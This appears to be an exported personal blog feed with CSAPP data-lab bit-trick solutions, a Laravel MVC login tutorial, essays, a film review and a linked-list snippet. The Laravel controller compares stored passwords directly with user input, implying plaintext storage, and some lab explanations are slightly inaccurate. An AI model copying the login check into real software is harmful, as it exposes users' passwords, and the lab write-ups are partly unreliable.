<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int leastBitPos(int x) &#123;</span><br><span class="line">    return x&amp;(~x+1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>实现思想：</strong></p>
<p>本题要求返回参数x最低设置为1的数。</p>
<p>我们先将x按位取反，取反后的数与原数据正好每一位都相反，我们再将该数加1，则此数会向前进一位，此时当且仅当原数的最低取取1位和取反后数据该位都为1，因此进行与运算后得到结果。</p>
<h5 id="int-divpwr2int-x-int-n"><a class="markdownIt-Anchor" href="#int-divpwr2int-x-int-n"></a> <code>int divpwr2(int x, int n)</code></h5>
<p><strong>实现代码：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int divpwr2(int x, int n) &#123;</span><br><span class="line">    int sign &#x3D;(x&gt;&gt;31)&amp;1;</span><br><span class="line">    int bias &#x3D; (sign&lt;&lt;n)+~sign +1;</span><br><span class="line">    return (x+bias)&gt;&gt;n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>实现思路：</strong></p>
<p>实验要求返回所给参数x/2^n的结果。</p>
<p>首先判断所给参数x的标志位，将x右移31位再和1进行与运算，若是正数则为0，负数则为1。</p>
<p>然后就是设置正数和负数的取整问题。当x为正数的时候，右移后向下取整，和题目要求相同，但是当x为负数时，也是向下取整，但此时题目要求要向上取整，因此要给负数加上一个偏置值再进行右移操作。因此负数要加上2^n-1来保证取整。</p>
<h5 id="6int-bitcountint-x"><a class="markdownIt-Anchor" href="#6int-bitcountint-x"></a> 6.<code>int bitCount(int x)</code></h5>
<p><strong>实现代码：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int bitCount(int x) &#123;</span><br><span class="line">    int t &#x3D; 0x55 + (0x55&lt;&lt;8);</span><br><span class="line">    int mask &#x3D; t + (t&lt;&lt;16);</span><br><span class="line">    x &#x3D; (x&amp;mask) + ((x&gt;&gt;1)&amp;mask);</span><br><span class="line"></span><br><span class="line">    t &#x3D; 0x33 + (0x33&lt;&lt;8);</span><br><span class="line">    mask &#x3D; t + (t&lt;&lt;16);</span><br><span class="line">    x &#x3D; (x&amp;mask) + ((x&gt;&gt;2)&amp;mask);</span><br><span class="line"></span><br><span class="line">    t &#x3D; 0xf + (0xf&lt;&lt;8);</span><br><span class="line">    mask &#x3D; t + (t&lt;&lt;16);</span><br><span class="line">    x &#x3D; (x&amp;mask) + ((x&gt;&gt;4)&amp;mask);</span><br><span class="line"></span><br><span class="line">    mask &#x3D; 0xff + (0xff&lt;&lt;16);</span><br><span class="line">    x &#x3D; (x&amp;mask) + ((x&gt;&gt;8)&amp;mask);</span><br><span class="line"></span><br><span class="line">    mask &#x3D; 0xff + (0xff&lt;&lt;8);</span><br><span class="line">    x &#x3D; (x&amp;mask) + ((x&gt;&gt;16)&amp;mask);</span><br><span class="line"></span><br><span class="line">    return x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>实现思路：</strong></p>
<p>问题要求返回参数x的位为1的个数。</p>
<p>所以我们需要一个个检查参数的每一位是否为1，并且将之累加起来。</p>
<p>从两位比特位入手，计算两位比特数中1的个数，就是高位与低位之和。</p>
<p>00: 0+0=(00)<sub>2</sub></p>
<p>01: 0+1=(01)<sub>2</sub></p>
<p>10: 1+0=(01)<sub>2</sub></p>
<p>11: 1+1=(10)<sub>2</sub></p>
<p>令一个二进制数B为b<sub>32</sub>b<sub>31</sub>…b<sub>1</sub></p>
<p>则L(l,r)表示一个二进制数在l和r区间之间的1的个数。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">L(l,r)&#x3D; L(l,x)+ L(x+1,r) (l&lt;&#x3D;x&lt;r)</span><br><span class="line">L(l,r)&#x3D; bl (l&#x3D;r)</span><br></pre></td></tr></table></figure>
<p>对于一个32位的整数来说，可以用动态规划的思想自底向上计算。先计算L(1,1)+L(2,2)。</p>
<p>先构造一个只有低位L(1,1)的数<code>a=x&amp;x=0x01</code>和高位L(2,2)的数<code>b=(x&gt;&gt;1)&amp;0x01</code>,但我们发现可以同时计算L(3,3)和L(4,4)等数。只需将构造改为：</p>
<p><code>a=x&amp;0x55555555</code>,<code>b=(x&gt;&gt;1)&amp;0x55555555</code>, <code>x=a+b</code></p>
<p>计算L(1,2)和L(3,4)以此类推：</p>
<p><code>a=x&amp;0x33333333</code>, <code>b=(x&gt;&gt;1)&amp;0x33333333</code>, `x=a+b</p>
<h5 id="7-int-conditionalint-x-int-y-int-z"><a class="markdownIt-Anchor" href="#7-int-conditionalint-x-int-y-int-z"></a> 7. <code>int conditional(int x, int y, int z)</code></h5>
<p><strong>实现代码：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int conditional(int x, int y, int z) &#123;</span><br><span class="line">  x &#x3D; (!!x)&lt;&lt;31&gt;&gt;31;</span><br><span class="line">  return (y&amp;x)|(z&amp;~x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>实现思路：</strong></p>
<p>题目要求该函数实现三元运算符，若x为真，则返回y,否则返回z。</p>
<p>若<code>x</code>的取值为<code>0x00000000</code>或<code>0xFFFFFFFF</code>。则答案为<code>(x&amp;y)|(~x&amp;z)</code>。</p>
<p>若<code>x！=0</code>时，将<code>x=0xFFFFFFFF</code>。<code>x = (!!x)&lt;&lt;31&gt;&gt;31</code>。</p>
<h5 id="8-int-isnonnegativeint-x"><a class="markdownIt-Anchor" href="#8-int-isnonnegativeint-x"></a> 8. <code>int isNonNegative(int x)</code></h5>
<p><strong>实现代码：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int isNonNegative(int x) &#123;</span><br><span class="line">    return !(x&gt;&gt;31);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>实现思路：</strong></p>
<p>判断最高位。</p>
<h5 id="9int-isgreaterint-x-int-y"><a class="markdownIt-Anchor" href="#9int-isgreaterint-x-int-y"></a> 9.<code>int isGreater(int x, int y)</code></h5>
<p><strong>实现代码：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int isGreater(int x, int y) &#123;</span><br><span class="line">    int sign_x&#x3D;x&gt;&gt;31;</span><br><span class="line">    int sign_y&#x3D;y&gt;&gt;31;</span><br><span class="line">    int equal&#x3D;!(sign_x^sign_y)&amp;((~y+x)&gt;&gt;31);</span><br><span class="line">    int notequal&#x3D;sign_x&amp;!sign_y;</span><br><span class="line">    return !(equal|notequal);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>实现思路：</strong></p>
<p>题目要求如果x&gt;y返回1否则返回0。</p>
<p>以下情况会返回<code>1</code>：</p>
<p>当<code>x&gt;0,y&lt;0</code>，或者当<code>x</code>和<code>y</code>符号相同时<code>mark_ = ~((x^y)&gt;&gt;31)</code>，满足<code>x+~y+1&gt;0</code>，<code>x!=y</code>时，<code>equl_ = !!(x^y)=1</code>，<code>x+~y+1&gt;=0</code>时，<code>(~(x+~y+1))&gt;&gt;31 = 0xffffffff</code></p>
<h5 id="10int-absvalint-x"><a class="markdownIt-Anchor" href="#10int-absvalint-x"></a> 10.<code>int absVal(int x)</code></h5>
<p><strong>实现代码：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int absVal(int x) &#123;</span><br><span class="line">  int sign&#x3D;x&gt;&gt;31;</span><br><span class="line">  return (x^sign)+(sign&amp;1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>实现思路：</strong></p>
<p>返回x的绝对值。</p>
<p>首先判断x的符号位，即右移31位。</p>
<p>倘若为正数，则返回值不变；则先用x与sign异或再加上sign与1与运算。</p>
<p>倘若为负数则异或后（即按位取反减1）后要再加上。</p>
<h5 id="11-int-ispower2int-x"><a class="markdownIt-Anchor" href="#11-int-ispower2int-x"></a> 11. <code>int isPower2(int x)</code></h5>
<p><strong>实现代码：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int isPower2(int x) &#123;</span><br><span class="line">    int sign1&#x3D;!(x&gt;&gt;31);</span><br><span class="line">    int sign2&#x3D;!!x;</span><br><span class="line">    int sign3&#x3D;!(x&amp;(x+~0));</span><br><span class="line">    return (sign1&amp;sign2&amp;sign3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>实现思路：</strong></p>
<p>题目要求如果参数x是2的权重返回1，否则返回0（负数都返回0）。</p>
<p>首先<code>sign1</code>判断x是正数还是负数，<code>sign2</code>判断x是否为0。若x为2的倍数，则x的位中则只有一位为1，因此当x为2的倍数时x和（x-1）按位与的结果必然为0，否则为1，因此将<code>!(x&amp;(x+~0))</code>作为<code>sign3</code>最后取与运算则得到结果。</p>
<h5 id="12unsigned-float_negunsigned-uf"><a class="markdownIt-Anchor" href="#12unsigned-float_negunsigned-uf"></a> 12.<code>unsigned float_neg(unsigned uf)</code></h5>
<p><strong>实现代码：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">unsigned float_neg(unsigned uf) &#123;</span><br><span class="line">    if((uf&amp;0x7fffffff)&gt;0x7f800000)return uf;</span><br><span class="line">    return uf^0x80000000;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>实现思路：</strong></p>
<p>直接使用<code>&gt;</code>判断即可，但需要注意<code>+0/-0</code>还有<code>NaN</code>这两种特殊情况。</p>
<p>判断<code>NaN</code>时，指数段为<code>0xff</code>，小数段不全为<code>0</code>，<code>(uf&amp;0x7fffffff) &gt; 0x7f800000</code>。</p>
<h5 id="13unsigned-float_i2fint-x"><a class="markdownIt-Anchor" href="#13unsigned-float_i2fint-x"></a> 13.<code>unsigned float_i2f(int x)</code></h5>
<p><strong>实现代码：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">unsigned float_i2f(int x) &#123;</span><br><span class="line">  int s_ &#x3D; x&amp;0x80000000;</span><br><span class="line">  int n_ &#x3D; 30;</span><br><span class="line">  if(!x) return 0;</span><br><span class="line">  if(x&#x3D;&#x3D;0x80000000) return 0xcf000000;</span><br><span class="line">  if(s_) x &#x3D; ~x+1;</span><br><span class="line">  while(!(x&amp;(1&lt;&lt;n_))) n_--;</span><br><span class="line">  if(n_&lt;&#x3D;23) x&lt;&lt;&#x3D;(23-n_);</span><br><span class="line">  else&#123;</span><br><span class="line">    x+&#x3D;(1&lt;&lt;(n_-24));</span><br><span class="line">    if(x&lt;&lt;(55-n_)) ;else x&amp;&#x3D;(0xffffffff&lt;&lt;(n_-22));</span><br><span class="line">    if(x&amp;(1&lt;&lt;n_))  ;else n_++;</span><br><span class="line">    x &gt;&gt;&#x3D; (n_-23);</span><br><span class="line">  &#125;</span><br><span class="line">  x&#x3D;x&amp;0x007fffff;</span><br><span class="line">  n_&#x3D;(n_+127)&lt;&lt;23;</span><br><span class="line">  return x|n_|s_;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>实现思路：</strong></p>
<p>分三部分处理，获取符号位<code>s_ = x&amp;0x80000000</code>，若为负数<code>-x</code>，变为正数，则<code>0x80000000</code>为特殊情况分开处理，考虑特殊情况，<code>0x0</code>和<code>0x80000000</code>，这两种情况直接返回<code>0</code>和<code>0xcf000000</code>。</p>
<p>获取最高位的<code>1</code>所在位置，<code>while(!(x&amp;(1&lt;&lt;n_))) n_--;</code>。</p>
<p>若<code>n_ &lt;= 23</code>这个数需要向左移动到小数部分起始位置（将<code>1</code>放在第<code>23</code>位上），<code>if(n_&lt;=23) x&lt;&lt;=(23-n_);</code>。</p>
<p>若<code>n_ &gt; 23</code>这个数需要向右移动到小数部分起始位置（将<code>1</code>放在第<code>23</code>位上），这时候需要考虑移出部分的舍入问题，若移出部分大于<code>0.5</code>则向上舍入，若小于<code>0.5</code>则向下舍去，若等于<code>0.5</code>则向偶数舍入。</p>
<p>先将<code>&gt;=0.5</code>情况等同考虑，向上舍入<code>x+=(1&lt;&lt;(n_-24))</code>。若<code>==0.5</code>时，舍入情况若为奇数，我们需要<code>-1</code>操作变为偶数，即将最低位的<code>1</code>变为<code>0</code>，<code>x&amp;=(0xffffffff&lt;&lt;(n_-22))</code>，若向上舍入时最高位产生了进位，还需要加上进位<code>if(x&amp;(1&lt;&lt;n_)) ;else n_++;</code>。之后拼接浮点数即可。</p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>CSAPP</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>从Laravel框架浅谈MVC架构</title>
    <url>/2020/03/07/1/</url>
    <content><![CDATA[<p>最近应工作室要求学习PHP框架Laravel，接触到了MVC软件架构模式,即Model-View-Controller，这里我将使用Laravel框架介绍MVC架构模式，并且阐述自己对MVC软件架构浅薄的理解。</p>
<p><img src="/2020/03/07/1/MVC.jpg" alt></p>
<a id="more"></a>
<h2 id="mvc架构简述"><a class="markdownIt-Anchor" href="#mvc架构简述"></a> MVC架构简述：</h2>
<h4 id="由图所示简单地理解mvc架构模式可以认为"><a class="markdownIt-Anchor" href="#由图所示简单地理解mvc架构模式可以认为"></a> 由图所示，简单地理解MVC架构模式可以认为：</h4>
<p>1.View（视图）：是用户直接接触的界面，一般由前端处理，主要用来展示模型中的内容和用来输入表单数据。</p>
<p>2.Controller（控制器）：主要用于处理视图和模型之间的逻辑关系，例如从视图中post的数据，到底如何进入模型并存入数据库中，我们是否应该对于用户的数据进行过滤以防止SQL注入等问题，又或者从数据库中取出的数据哪些应该展示在视图上，有什么判断标准，都需要控制器进行判断。</p>
<p>3.Model（模型）：即底层同应用程序的接口，我们可以从Model中获取数据并进行处理。</p>
<p>以上是我对于MVC的一些理解，因为刚刚接触这种软件架构模式，所以理解不深，如果有兴趣者可以自行去深入了解。</p>
<h4 id="以下给出mvc的一些友情链接"><a class="markdownIt-Anchor" href="#以下给出mvc的一些友情链接"></a> 以下给出MVC的一些友情链接：</h4>
<p><a href="%22%5Bhttps://en.wikipedia.org/wiki/Model%E2%80%93view%E2%80%93controller%5D">维基百科</a></p>
<p><a href="%22https://draveness.me/mvx%22">浅谈MVC、MVP和MVVM架构模式</a></p>
<h2 id="laravel实例"><a class="markdownIt-Anchor" href="#laravel实例"></a> Laravel实例：</h2>
<h4 id="接下来我将使用laravel对于这一架构模式进行说明laravel只是媒介这里不涉及laravel语法细节"><a class="markdownIt-Anchor" href="#接下来我将使用laravel对于这一架构模式进行说明laravel只是媒介这里不涉及laravel语法细节"></a> 接下来我将使用Laravel对于这一架构模式进行说明（Laravel只是媒介，这里不涉及Laravel语法细节）：</h4>
<p>假如说我们需要写一个登录界面那么我们使用MVC如何处理呢？</p>
<p>首先，我们需要一个登陆界面，这个登录界面是需要让用户看到的，并且在这个界面中，我们还需要让用户在登录界面中输入数据并且可以让控制器接收到，因此我们可以写html，php或者Laravel支持的blade模板，总之，不管使用哪种形式，最重要的是让用户有可视化界面并且实现登陆功能。</p>
<p>我用blade模板进行举例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@extends(&quot;common.layout&quot;)</span><br><span class="line">@section(&quot;title&quot;)</span><br><span class="line">    Login</span><br><span class="line">@stop</span><br><span class="line"></span><br><span class="line">@section(&quot;content&quot;)</span><br><span class="line"></span><br><span class="line">    &lt;div class&#x3D;&quot;xiao-container&quot;&gt;</span><br><span class="line">        &lt;div class&#x3D;&quot;xiao-register-box&quot;&gt;</span><br><span class="line">            &lt;div class&#x3D;&quot;xiao-title-box&quot;&gt;</span><br><span class="line">                &lt;span&gt;登录&lt;&#x2F;span&gt;</span><br><span class="line">            &lt;&#x2F;div&gt;</span><br><span class="line">            &lt;form action&#x3D;&quot;&#123;&#123;url(&#39;at&#x2F;save&#39;)&#125;&#125;&quot; method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">                &#123;&#123;csrf_field()&#125;&#125;</span><br><span class="line">                &lt;div class&#x3D;&quot;xiao-username-box&quot;&gt;</span><br><span class="line">                    &lt;span class&#x3D;&quot;xiao-require&quot;&gt;*&lt;&#x2F;span&gt;</span><br><span class="line">                    &lt;label for&#x3D;&quot;account&quot;&gt;账户&lt;&#x2F;label&gt;</span><br><span class="line">                    &lt;div class&#x3D;&quot;xiao-username-input&quot;&gt;</span><br><span class="line">                        &lt;input type&#x3D;&quot;text&quot; id&#x3D;&quot;account&quot; name&#x3D;&quot;account&quot; placeholder&#x3D;&quot;账户：&quot;&#x2F;&gt;</span><br><span class="line">                    &lt;&#x2F;div&gt;</span><br><span class="line">                &lt;&#x2F;div&gt;</span><br><span class="line">                &lt;br&#x2F;&gt;&lt;br&#x2F;&gt;</span><br><span class="line"></span><br><span class="line">                &lt;div class&#x3D;&quot;xiao-userPassword-box&quot;&gt;</span><br><span class="line">                    &lt;span class&#x3D;&quot;xiao-require&quot;&gt;*&lt;&#x2F;span&gt;</span><br><span class="line">                    &lt;label for&#x3D;&quot;password&quot;&gt;密码&lt;&#x2F;label&gt;</span><br><span class="line">                    &lt;div class&#x3D;&quot;xiao-userPassword-input&quot;&gt;</span><br><span class="line">                        &lt;input type&#x3D;&quot;password&quot; id&#x3D;&quot;password&quot; name&#x3D;&quot;password&quot; placeholder&#x3D;&quot;密码：&quot; &#x2F;&gt;</span><br><span class="line">                    &lt;&#x2F;div&gt;</span><br><span class="line">                &lt;&#x2F;div&gt;</span><br><span class="line">                &lt;div class&#x3D;&quot;xiao-submit-box&quot;&gt;</span><br><span class="line">                    &lt;input id &#x3D; &quot;xiao-submit-button&quot; type&#x3D;&quot;submit&quot; value&#x3D;&quot;登录&quot;&gt;</span><br><span class="line">                &lt;&#x2F;div&gt;</span><br><span class="line">            &lt;&#x2F;form&gt;</span><br><span class="line">            @if ($errors-&gt;any())</span><br><span class="line">                &lt;div class&#x3D;&quot;alert alert-danger&quot;&gt;</span><br><span class="line">                    &lt;ul&gt;</span><br><span class="line">                        @foreach ($errors-&gt;all() as $error)</span><br><span class="line">                            &lt;li&gt;&#123;&#123; $error &#125;&#125;&lt;&#x2F;li&gt;</span><br><span class="line">                        @endforeach</span><br><span class="line">                    &lt;&#x2F;ul&gt;</span><br><span class="line">                &lt;&#x2F;div&gt;</span><br><span class="line">            @endif</span><br><span class="line">        &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">@stop</span><br></pre></td></tr></table></figure>
<p>我们无需管语法细节，只需要注意，我们在这里设计了一个表单，并且将方法设置为post，因此可以使控制器接收到数据，那么相应地，我们也需要设置相应的路由与控制器方法（路由是用户访问url所必需的）</p>
<h4 id="路由"><a class="markdownIt-Anchor" href="#路由"></a> 路由：</h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Route::any(<span class="string">'at/login'</span>,[<span class="string">'uses'</span> =&gt; <span class="string">'StudentController@login'</span>]);</span><br><span class="line">Route::any(<span class="string">'at/save'</span>,[<span class="string">"uses"</span> =&gt; <span class="string">"StudentController@save"</span>]);</span><br></pre></td></tr></table></figure>
<h4 id="控制器"><a class="markdownIt-Anchor" href="#控制器"></a> 控制器：</h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StudentController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> view(<span class="string">'student.login'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">(Request $request)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $validate= $request-&gt;validate(</span><br><span class="line">            [</span><br><span class="line">                <span class="string">"account"</span> =&gt; <span class="string">"required|string|max:20"</span>,</span><br><span class="line">                <span class="string">"password"</span> =&gt; <span class="string">"required|string|max:20"</span></span><br><span class="line">            ]</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span>($validate)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;judge($request-&gt;input(<span class="string">"account"</span>),$request-&gt;input(<span class="string">"password"</span>)))</span><br><span class="line">            &#123;<span class="keyword">return</span> <span class="keyword">true</span>;&#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"账号不存在或密码不正确"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">judge</span><span class="params">($account,$password)</span></span></span><br><span class="line"><span class="function">    </span>&#123;<span class="keyword">return</span> Student::where(<span class="string">"account"</span>,$account)-&gt;value(<span class="string">'password'</span>)==$password;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这样我们就可以了解到从登录界面post的数据，被控制器中的save的$request变量捕获了，并且将其进行了表单验证，我们需要进行两次验证，第一次验证用户输入是否合法，如果不合法，该方法将会重定向到登录页面要求你重新输入，否则的话，进行第二次验证，从Model里（我们在Model封装了数据库，这里不再展示）取出数据进行比对，如果账号密码都符合条件，就成功验证，否则会告诉你账号或密码输入不正确。</p>
<p>现在，我们就完成了最简单的MVC与User之间的交互模式。</p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>后端开发</tag>
        <tag>Laravel</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>我不适合写作文</title>
    <url>/2020/03/05/1/</url>
    <content><![CDATA[<p>从小学到高中，我的作文成绩从来没有高过，因为当我拿到特定的作文题目时，并且被要求在特定规限的时间写完，我总是感到头脑一片空白和不知所措，只能依靠一些特定的写法和烂俗的套路完成；或许有时候我遇到一些灵光乍现的想法，但这些想法也通常不被认可。</p>
<a id="more"></a>
<p>但是，当我看完其他人的”优秀作文“以后，我却觉得他们写的一点也不比我好，同样是特定的写法和烂俗的套路，唯一比我具有优势的是他们的字写的比我好。而且我发现，他们仿佛除了作文以外，是不大会写其他东西的，这使我想到，“写作文”和“写文章”根本不是一码事，作文写得好无非是套路掌握得好或者更加迎合试卷命题与阅卷老师的心理罢了。而文章，则是天马行空，无所不至，你想写就写，不想写就不写，不必受到题目的限制，只需要有感情的召唤就足够了。</p>
<p>我觉得写文章是自己的事，是不能被其他人的其他标准所评判的。</p>
]]></content>
      <categories>
        <category>杂文</category>
      </categories>
      <tags>
        <tag>吐槽</tag>
      </tags>
  </entry>
  <entry>
    <title>See You Never</title>
    <url>/2020/03/04/1/</url>
    <content><![CDATA[<p>刚刚看完了《后会无期》，觉得还是一个不错的片子，虽然被很多人诟病为没有主线剧情，结构松散。但是，我想表达的是，不是所有的影片都需要完整的主线剧情，只要影片所表达的东西，可以告诉观众一些东西，或者震撼观众的心灵，就是好的影片。</p>
<p>这部影片虽然没有主要的剧情，但一对对的分支的剧情，也确实围绕着“后会无期”的主题展开，从头到尾主人公一行遇到的人或事，在最终都是“后会无期”，注意，这里的后会无期并非是以后再也不会见到了，而是“有可能遇到，也有可能遇不到了”，也就是处于一种“未卜”的状态，其中使我震撼的一段是马浩汉将被雨淋湿的钱和江河把苏米的“包小姐”联系牌放在车窗上晒，然后等一觉醒来以后，却发现连车窗都没了，这段确实十分的荒诞，但倘若联系到实际的话，不得不承认它具备一定的合理性，连死物件都可能后会无期，何况人呢？</p>
<a id="more"></a>
<p><img src="/2020/03/04/1/1.jpg" alt></p>
<p>从马浩汉用火烧了房子却忘了把煤气罐搬出房子开始，就注定这是一场有去无回的旅行，虽然马浩汉开始的表现十分的一往无前和具有极大的勇气，但随着时间的消磨，而实际上最具有勇气的是江河这个未经社会打磨，具备理想主义和有些神经质的地理教师。虽然马浩汉鼓吹自己“行路多，社会阅历广，朋友多”，但不得不承认像江河这种习惯孤独的人才不容易被恶劣的环境打败。</p>
<p>最后说一说关于苏米同江河之间有些“朦胧”的感情，虽然苏米直言“自己很厌恶男人”，并且在首先同江河交流的时候，时不时露出揶揄的表情，但是苏米在听到江河“无脑”的同声传译却在不经意间攻破了苏米的防线。儿时对未来的幻想，有哪个是没有的呢？又有多少人，能够在自己长大的时候，回望当初的期许，而不生出一点遗憾的呢？“我会变漂亮吗？”好像是。“我会变富有吗？”好像不是。“世事难料”的确如此。“顺其自然。”我还可以做到吗？于是苏米望过来的眼神就开始变化了。注意到苏米两次让江河“说点什么以缓解尴尬”，第一次说的时候，她面无表情；但是在第二次说的时候，她面带微笑，无比轻松惬意。</p>
<p>最后来到了三叔一行赶到了主角一行所在的加油站，当苏米看到三叔一行来到的时候，她感到“惊讶与错愕”，连刚买的东西都掉落了。当她同她失语的哥哥用手语交流，并“直言不讳”地说出“我好像喜欢上他了”，她本期盼得到哥哥诸如鼓励的话，但得到的确是“你忘了那个王八蛋了吗？”。</p>
<p>江河一只看起来呆头呆脑，在感情中处于被动状态，但从他那孱弱的身躯但却一脚踹开旅馆那个岌岌可危的大门的时候，就已经证明这个男人实在蕴含着无尽的能量，他对于苏米表达喜欢的方式就是不断劝她从良，具体来说，我感觉这就像是现实生活中我们某些直男的做法（逃。</p>
<p>而实际上，苏米也并无像她表现的那样对于社会的美好一切看破，也就如同马浩汉看起来那么乐观一样，而真正所谓“看破尘世美好的”，大概是像她三叔那样，虽然嘴里说着“只有家人替你好”，可实际上却又逼着你犯罪。最终，苏米被带走，后会无期。</p>
<p>最终结尾是苏米靠在了江河的肩上，虽然我不知道这是不是幻想，但我相信它是现实。</p>
<p>最后的最后，我希望同有的人永远后会无期，有的人…我期盼再次相遇。</p>
<hr>
<p>最近看了几篇影评，想再来补充几句，有的人说其实马浩汉从刘莺莺那里出发之后就遭遇车祸死去了，后来的全是江河在自己的小说《旅行者》的臆想，从那个神秘人物阿吕开始就是江河小说中的想象了，直至最会江河和浩汉的分别更是暗示了浩汉的死亡。而且电影开始也以胡生的口吻暗示了这是江河的小说《旅行者》的故事。而后江河与浩汉的故事则是江河本人的分裂了，至于最后看起来美好的结局也有着诡异之处，比如在东极岛上暴雨下柴伯公巨像的火炬仍然燃烧，还有幽灵导游的声音。这是浪漫主义的处理手法，我相信是如此的。现实太残酷了，总是要有浪漫的。</p>
<p><img src="/2020/03/04/1/2.jpg" alt></p>
]]></content>
      <categories>
        <category>电影</category>
      </categories>
      <tags>
        <tag>文学</tag>
        <tag>人生</tag>
      </tags>
  </entry>
  <entry>
    <title>Reserve Linked List</title>
    <url>/2020/03/02/1/</url>
    <content><![CDATA[<p>Last week I learned data structure about Linked List , in which include an algorithm for reversing a linked list . And in this chapter I will introduce this algorithm.</p>
<a id="more"></a>
<p>First considering a simple example . You is given a linked list of integers , and the question asks you to invert this linked list.</p>
<p>For example:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;NULL</span><br><span class="line"></span><br><span class="line">5-&gt;4-&gt;3-&gt;2-&gt;1-&gt;NULL</span><br></pre></td></tr></table></figure>
<p>For iterating through this linked list and inverting it , you can declare three pointers (prev , curr, next), which represent the previous , current , next pointers. And in this way can you search this linked list and invert it iteratively.</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"> <span class="function">ListNode* <span class="title">reverseList</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">​    ListNode* prev=<span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">​    ListNode* curr=head;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">while</span>(curr!=<span class="literal">NULL</span>)</span><br><span class="line"></span><br><span class="line">​    &#123;</span><br><span class="line"></span><br><span class="line">​      ListNode* next=curr-&gt;next;</span><br><span class="line"></span><br><span class="line">​      curr-&gt;next=prev;</span><br><span class="line"></span><br><span class="line">​      prev=curr;</span><br><span class="line"></span><br><span class="line">​      curr=next;</span><br><span class="line"></span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">return</span> prev;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>C/C++</tag>
        <tag>Leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>关于意大利</title>
    <url>/2020/02/29/1/</url>
    <content><![CDATA[<h3 id="蛋堡"><a class="markdownIt-Anchor" href="#蛋堡"></a> 蛋堡</h3>
<p><img src="/2020/02/29/1/Italy1.jpg" alt="蛋堡" title="蛋堡"></p>
<h3 id="那不勒斯"><a class="markdownIt-Anchor" href="#那不勒斯"></a> 那不勒斯</h3>
<p><img src="/2020/02/29/1/Italy2.jpg" alt="那不勒斯" title="那不勒斯"></p>
<h3 id="卡布里岛"><a class="markdownIt-Anchor" href="#卡布里岛"></a> 卡布里岛</h3>
<p><img src="/2020/02/29/1/Italy3.jpg" alt="卡布里岛" title="卡布里岛"><a id="more"></a></p>
<h3 id="卡布里岛上的购物街"><a class="markdownIt-Anchor" href="#卡布里岛上的购物街"></a> 卡布里岛上的购物街</h3>
<p><img src="/2020/02/29/1/Italy4.jpg" alt="卡布里岛上的购物街" title="卡布里岛上的购物街"></p>
<h3 id="傍晚的苏莲托"><a class="markdownIt-Anchor" href="#傍晚的苏莲托"></a> 傍晚的苏莲托</h3>
<p><img src="/2020/02/29/1/Italy5.jpg" alt="傍晚的苏莲托" title="傍晚的苏莲托"></p>
<h3 id="酒店在举办音乐会"><a class="markdownIt-Anchor" href="#酒店在举办音乐会"></a> 酒店在举办音乐会</h3>
